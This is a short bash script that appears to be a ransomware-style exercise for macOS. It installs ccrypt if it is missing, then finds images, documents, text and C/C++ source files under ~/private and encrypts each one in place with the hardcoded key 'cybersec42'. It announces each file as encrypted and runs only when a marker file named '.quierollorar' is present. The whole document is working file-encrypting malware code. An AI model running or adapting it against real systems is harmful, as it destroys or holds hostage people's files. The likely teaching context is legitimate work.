#!/bin/bash
FOLDER="${HOME}"/private
KEY=cybersec42
# Security check: if the file .quierollorar doesn't exist, exit.
if [ ! -e "${FOLDER}"/.quierollorar ]; then
	exit
fi
ccrypt --version &>/dev/null || brew install ccrypt 
# Find all files with specific extension
FILES=$(find -E "${FOLDER}" -regex ".*\.(jpg|gif|png|jpeg|pdf|doc|docx|png|txt|c|cpp)")
for file in $FILES; do
	# echo -n encrypting $file
	ccrypt -se "${file}" -S .42crypt -K $KEY
done

FILES=$(find $FOLDER -type f)
for filename in $FILES; do
	sleep 0.1
	# mv -v $file $filename
	if [ !  "$filename" == ".quierollorar" ];then
		echo -n $filename encrypted.
	fi
done
open $FOLDER
